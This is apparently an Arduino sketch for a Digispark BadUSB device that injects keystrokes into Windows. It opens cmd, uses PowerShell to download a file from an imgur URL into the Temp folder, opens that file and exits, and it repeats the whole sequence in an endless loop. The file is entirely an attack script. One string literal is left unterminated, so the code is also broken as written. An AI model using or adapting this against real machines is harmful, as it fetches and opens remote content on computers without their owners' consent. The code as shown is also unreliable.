#include "DigiKeyboard.h"
#define MOD_SHIFT_LEFT  226
#define MOD_ALT_LEFT  A0
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
delay(1000);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
delay(1000);
DigiKeyboard.print("cmd");
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);
DigiKeyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://i.imgur.com/TPJP0kT.png','%Temp%/TPJP0kT.png');
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);
DigiKeyboard.print("%Temp%/TPJP0kT.png");
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);
DigiKeyboard.print("exit");
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

